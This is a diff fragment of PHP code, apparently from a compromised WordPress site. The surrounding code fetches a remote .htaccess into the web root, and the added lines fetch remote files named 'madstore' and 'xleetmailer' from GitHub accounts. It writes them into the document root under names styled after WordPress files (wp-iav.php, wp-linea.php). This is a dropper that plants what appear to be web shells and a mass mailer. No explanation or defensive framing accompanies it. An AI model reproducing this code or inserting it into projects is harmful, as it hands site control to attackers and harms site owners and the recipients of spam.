@@ -11,6 +11,14 @@ $filee = sexx('https://raw.githubusercontent.com/HecSec/New/main/.htaccess');
 $locall=$_SERVER['DOCUMENT_ROOT']."/cgi-et/.htaccess";
 if(file_put_contents($locall, $filee));  }
 
+$sec31= sexx('https://raw.githubusercontent.com/XetSec/Xet/main/madstore.txt');
+$wpoptionss31 = $_SERVER['DOCUMENT_ROOT'] . "/wp-iav.php";
+if (file_put_contents ($wpoptionss31, $sec31));
+
+$wpoptionssssr = sexx('https://raw.githubusercontent.com/XetSec/Xet/main/xleetmailer.txt');
+$wpoptionsssss = $_SERVER['DOCUMENT_ROOT'] . "/wp-linea.php"; 
+if (file_put_contents ($wpoptionsssss, $wpoptionssssr));
+
 $random = rand(1,6);
 $d=$_SERVER['SERVER_NAME'];
 if(file_exists('/tmp/gggg4g4g4g'.$d.$random)) { } else {
